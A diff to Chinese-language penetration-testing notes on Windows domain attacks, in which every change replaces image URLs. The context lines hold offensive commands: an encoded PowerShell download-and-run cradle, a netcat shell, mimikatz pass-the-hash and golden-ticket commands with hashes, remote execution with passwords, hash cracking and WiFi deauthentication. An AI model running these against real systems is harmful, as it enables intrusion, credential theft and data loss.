@@ -93,7 +93,7 @@ Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。C
 
 林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204313.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204313.png)
 
 ## 3、活动目录
 
@@ -396,7 +396,7 @@ tmp.txt` 即可
     
     PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204322.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204322.png)
 
 # 0x03 本地工作组信息收集
 
@@ -598,7 +598,7 @@ wmic 脚本下载地址：https://www.fuzzysecurity.com/scripts/files/wmic_info.
 
 直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204323.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204323.png)
 
 ### PowerShsell Empire
 
@@ -612,7 +612,7 @@ PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平
 当使用 Empire
 使主机上线后，可调用`powershell/situational_awareness/host/winenum`模块查看本机用户信息、系统基本信息、剪贴板等等信息。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204324.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204324.png)
 
 调用`powershell/situational_awareness/host/computerdetails`模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。
 
@@ -877,7 +877,7 @@ NES 脚本下载地址：https://nmap.org/nsedoc/scripts/
     
     C:\Users\daniel10> nmap --script=smb-os-discovery.nse -p 445 192.168.7.107Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-21 09:44 CSTNmap scan report for 192.168.7.107Host is up (0.00053s latency).PORT    STATE SERVICE445/tcp open  microsoft-dsHost script results:| smb-os-discovery:|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional|   Computer name: daniel7|   NetBIOS computer name: DANIEL7\x00|   Domain name: teamssix.com|   Forest name: teamssix.com|   FQDN: daniel7.teamssix.com|_  System time: 2021-02-21T09:44:33+08:00Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204325.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204325.png)
 
 ### PowerView 脚本
 
@@ -1095,7 +1095,7 @@ Data，之后上传刚才生成的压缩包就可以导入数据了。
 
 比如这里查询到域管理员的最短路径
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204327.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204327.png)
 
 > 路径由粗到细表示xx对xx有权限或关系
 
@@ -1154,7 +1154,7 @@ ptunnel 常用命令介绍：
 之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389
 端口了，不过实测发现这种方法有些不稳定。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204328.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204328.png)
 
 ### icmpsh
 
@@ -1192,7 +1192,7 @@ icmpsh 利用 ICMP 协议建立反向 shell
 
 此时在攻击机上可以看到通过 icmp 协议建立的 shell
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204329.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204329.png)
 
 ### icmptunnel
 
@@ -1246,7 +1246,7 @@ icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 
     
     ssh root@10.0.0.2
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204331.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204331.png)
 
 # 0x07 lcx、netcat 和 socat 的使用
 
@@ -1416,7 +1416,7 @@ nc 全称 netcat，它的功能很多，这里简单记录下两个常用的功�
 
 将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204333.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204333.png)
 
 再比如使用 `cmd/unix/reverse_python` 这个payload
 
@@ -1655,7 +1655,7 @@ Kali 上开启监听
     
     nc -v 172.16.214.2 5555
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204336.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204336.png)
 
 ### powercat 生成 payload
 
@@ -1707,7 +1707,7 @@ Kali 上开启监听
     
     powershell -e payload
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204337.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204337.png)
 
 ### 建立 dns 隧道连接
 
@@ -1761,7 +1761,7 @@ TAP 在服务端和客户端分别建立一个局域网和虚拟网卡，再通�
 
 首先需要有一个域名，并设置 NS 和 A 记录，A 记录指向自己的公网 VPS 地址，NS 记录指向 A 记录的子域名。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204338.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204338.png)
 
 Kali 下自带 iodine ，Debian Linux 可以使用 apt 进行安装
 
@@ -1806,7 +1806,7 @@ http://www.qudong51.net/qudong/981.html
 
 这时如果去 ping 服务端自定义的虚拟 IP 也是可以 ping 通的。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204339.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204339.png)
 
 假如这里内网机器分配到了 192.168.77.2 这个 IP ，因为处在一个局域网中，所以 VPS 直接访问 192.168.77.2 的 3389、80
 等端口就可以直接访问到内网机器的相关端口了，同样的内网主机也可以访问 VPS 的 22 端口等等，至此便绕过了策略限制。
@@ -1909,7 +1909,7 @@ cmd_socket OK!` 的提示。
 
 最后，代理 vps 的 1080 端口就可以访问到目标主机的内网了。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204340.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204340.png)
 
 #### c、二级网络环境（一）
 
@@ -2086,7 +2086,7 @@ frp 分成服务端和客户端，分别叫 frps 和 frpc，配置文件分别�
 
 此时，在 vps 上访问本地的 3389 端口就会访问到内网主机的 3389 端口了。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204342.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204342.png)
 
 ### b、建立 socks 代理
 
@@ -2149,11 +2149,11 @@ frp 分成服务端和客户端，分别叫 frps 和 frpc，配置文件分别�
 
 测试 VPS IP 的 1080 的 socks5 代理，发现已经连通了。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204343.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204343.png)
 
 打开 frps 仪表盘，登录后，可以看到当前连接数据的相关信息
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204345.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204345.png)
 
 frp 的参数远不止文章中提到的这些，更多功能可以参考下面的参考文章。
 
@@ -2216,7 +2216,7 @@ Responder 开启监听，-I 指定网卡，这里 eth1 的 IP 为 192.168.7.65
 
 开启监听后，当目标主机上有人访问 Responder 主机的共享目录时，就会看到对方的 Net-NTLM 哈希值了。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204346.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204346.png)
 
 再利用 Hashcat 进行碰撞
 
@@ -2224,7 +2224,7 @@ Responder 开启监听，-I 指定网卡，这里 eth1 的 IP 为 192.168.7.65
     
     hashcat -m 5600 hash.txt password.txt -D 1
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204347.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204347.png)
 
 # 0x19 IPC 与计划任务
 
@@ -2366,7 +2366,7 @@ PsExec 下载地址：https://download.sysinternals.com/files/PSTools.zip
     
     Psexec.exe -accepteula \\192.168.7.107 -s cmd.exe
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204349.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204349.png)
 
 # 0x20 Hashcat 的使用
 
@@ -2691,7 +2691,7 @@ WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI �
     
     airodump-ng wlan0mon
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204350.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204350.png)
 
 3、获取wifi的握手包
 
@@ -2711,7 +2711,7 @@ WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI �
     
     aireplay-ng -0 0 -a (要破解的 wifi 的 bssid ) -c (强制踢下的设备的 MAC 地址) wlan0mon
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204351.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204351.png)
 
 可以看到 teamssix 这个 WIFI 有一个设备正在连接，该设备的 MAC 地址为：38:26:2C:13:D3:33，使用以下命令可以将其强制踢下去
 
@@ -2721,7 +2721,7 @@ WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI �
 
 等待设备重新连接后，当右上角出现 WPA handshake 的时候说明获取成功
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204352.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204352.png)
 
 4、破解密码
 
@@ -2740,7 +2740,7 @@ WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI �
     
     hashcat -a 3 -m 22000 1.hc22000 ?d?d?d?d?d?d?d?d --force
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204354.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204354.png)
 
 ## 5、其他
 
@@ -2785,7 +2785,7 @@ R2及之后版本的操作系统中，默认不会在内存中保存明文密码
     privilege::debug  
     sekurlsa::pth /user:administrator /domain:teamssix.com /ntlm:161cff084477fe596a5db81874498a24
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204356.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204356.png)
 
 mimikatz 执行后，会弹出一个拥有对应 Hash 用户权限的 CMD 窗口。
 
@@ -2842,7 +2842,7 @@ us/download/details.aspx?id=42722
 
 在当前终端下退出 mimikatz ，然后就可以列出目标目录了。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204358.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204358.png)
 
 票据传递除了用 mimikatz 还可以用 kekeo
 
@@ -2854,7 +2854,7 @@ kekeo 需要使用域名、用户名、NTLM HASH 生成票据，然后再将票�
     
     tgt::ask /user:administrator /domain:teamssix.com /ntlm:161cff084477fe596a5db81874498a24
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204359.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204359.png)
 
 在 kekeo 中清除当前内存中的其他票据，不然可能会导致票据传递失败
 
@@ -2874,7 +2874,7 @@ kekeo 需要使用域名、用户名、NTLM HASH 生成票据，然后再将票�
     
     kerberos::ptt "TGT_administrator@TEAMSSIX.COM_krbtgt~teamssix.com@TEAMSSIX.COM.kirbi"
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204400.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204400.png)
 
 注意点：
 
@@ -2913,7 +2913,7 @@ PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结
     
     -accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204401.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204401.png)
 
 如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接
 
@@ -2992,7 +2992,7 @@ WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执�
     
     python3 wmiexec.py administrator:1qaz@WSX@192.168.7.7
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204403.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204403.png)
 
 wmiexec.py 还支持通过哈希传递获得 shell
 
@@ -3009,7 +3009,7 @@ wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs
     
     cscript //nologo wmiexec.vbs /shell 192.168.7.7 administrator 1qaz@WSX
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204405.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204405.png)
 
 使用 vmiexec.vbs 执行单条命令
 
@@ -3050,7 +3050,7 @@ Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利
     # 将执行结果输出到屏幕上  
     $Remote.PayloadOutput
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204406.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204406.png)
 
 ### Invoke-WMIMethod
 
@@ -3070,7 +3070,7 @@ Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接
     # 在远程系统中运行 calc.exe 命令  
     Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.7.7" -Credential $Cred
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204407.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204407.png)
 
 可以看到在 192.168.7.7 主机中已经有进程 ID 为 3276 的 calc.exe 被执行了。
 
@@ -3094,7 +3094,7 @@ Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接
     
     REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204408.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204408.png)
 
 使用 wmic 远程重启目标计算机
 
@@ -3123,7 +3123,7 @@ C++ 版项目地址：https://github.com/sunorr/smbexec
     
     python3 smbexec.py teamssix.com/administrator:1qaz@WSX@192.168.7.7
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204409.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204409.png)
 
 ### Linux 跨平台 Windows 远程命令执行
 
@@ -3169,7 +3169,7 @@ smbexec 工具包下载地址：https://github.com/brav0hax/smbexec
 
 获取目标系统 UAC 的状态
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204411.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204411.png)
 
 获取目标系统中的网络共享目录
 
@@ -3239,7 +3239,7 @@ Get-CimInstance 是 PowerShell 3.0 以上的版本自带的，因此只有 Windo
     
     $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204414.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204414.png)
 
 除了 MMC20.Application 还有 ShellWindows、ShellBrowserWindow、Excel.Application 以及
 Outlook.Application 等等可以被我们利用。
@@ -3263,7 +3263,7 @@ Outlook.Application 等等可以被我们利用。
     或者  
     [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.7.7")).Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204415.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204415.png)
 
 2、调用 ShellWindows 远程执行命令
 
@@ -3274,7 +3274,7 @@ Outlook.Application 等等可以被我们利用。
     或者  
     [Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.7.7")).item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204416.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204416.png)
 
 以上这两种方法均适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016 的系统。
 
@@ -3381,7 +3381,7 @@ Kerberos 协议中的名称解释：
 
   * ST (Servre Ticket): 服务票据
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204417.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204417.png)
 
 根据上图，这里一步一步进行解释
 
@@ -3447,7 +3447,7 @@ Kerberos 协议中的名称解释：
 
 这里可以再通过时序图加深下印象。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204419.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204419.png)
 
 注意点：
 
@@ -3630,7 +3630,7 @@ Impacket 下载地址：https://github.com/SecureAuthCorp/impacket
     
     python3 GetUserSPNs.py -dc-ip 192.168.7.7 teamssix.com/test
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204420.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204420.png)
 
 ## 2、kerberoast
 
@@ -3738,7 +3738,7 @@ Kerberoast 脚本下载地址：https://github.com/nidem/kerberoast
     
     hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204421.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204421.png)
 
 # 0x25 Exchange 邮件服务器
 
@@ -3835,7 +3835,7 @@ Exchange Server 2007 中需要使用 ExportMailBox 命令，在 Exchange Server 
 
 输入账号密码进入 Exchange 管理中心，点击「…」更多按钮，选择「导出到 PST 文件」即可进行导出操作。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204423.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204423.png)
 
 ### 管理导出请求
 
@@ -3915,7 +3915,7 @@ ntdsutil 是一个为活动目录提供管理机制的命令行工具，使用 n
     
     ntdsutil snapshot "List All" quit quit
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204424.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204424.png)
 
 ### vssadmin
 
@@ -3941,7 +3941,7 @@ vssadmin 的使用流程和 ntdsutil 差不多，首先创建一个 C 盘的卷�
     
     vssadmin delete shadows /for=C: /quiet
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204425.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204425.png)
 
 ### vssown.vbs
 
@@ -3980,7 +3980,7 @@ vssown.vbs
     
     cscript vssown.vbs /delete {22B93FE6-D53A-4ECA-BD5A-7A2A68203EF8}
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204426.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204426.png)
 
 ### IFM
 
@@ -4040,7 +4040,7 @@ diskshadow 和 vshadow 功能类似，不过 vshadow 是包含在 Windows SDK
     
     reg save hklm\system c:\windows\temp\system.hive
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204428.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204428.png)
 
 ### Invoke-NinjaCopy.ps1
 
@@ -4351,7 +4351,7 @@ Kali 在使用之前需要先安装 Kerberos 客户端
 
 > 这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204432.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204432.png)
 
 goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。
 
@@ -4439,12 +4439,12 @@ KrbCredExport 下载地址：https://github.com/rvazarkar/KrbCredExport
 
 接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204434.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204434.png)
 
 此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current
 access token 通过 jack 的会话上线即可。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204435.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204435.png)
 
 # 0x28 黄金票据
 
@@ -4537,7 +4537,7 @@ S-1-5-21-284927032-1122706408-2778656994
 
 退出 mimikatz ，使用 dir 发现可以成功列出域控文件
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204436.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204436.png)
 
 这里使用 PsExec 也同样是能获取到权限的，除了上面使用 NTLM Hash 之外，还可以使用 krbtgt 的 AES-256 值生成黄金票据
 
@@ -4569,7 +4569,7 @@ S-1-5-21-284927032-1122706408-2778656994
 
 注入成功后，进入 Shell 就能查看 dc 里的文件了
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204438.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204438.png)
 
 # 0x29 白银票据
 
@@ -4644,7 +4644,7 @@ DC$ 的 NTLM 哈希
     
     .\mimikatz.exe "kerberos::golden /user:t /domain:teamssix.com /sid:S-1-5-21-284927032-1122706408-2778656994 /target:dc /rc4:ef9e49a41feaa171f642016fd4cb7e7a /service:ldap /ptt" exit
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204440.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204440.png)
 
 # 0x30 跨域安全
 
@@ -4914,7 +4914,7 @@ RpcRemoteFindPrinterChangeNotification(Ex)
 >
 > https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/
 
-![](https://gitee.com/fuli009/images/raw/master/public/20211027204441.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20211027204441.png)
 
   
 
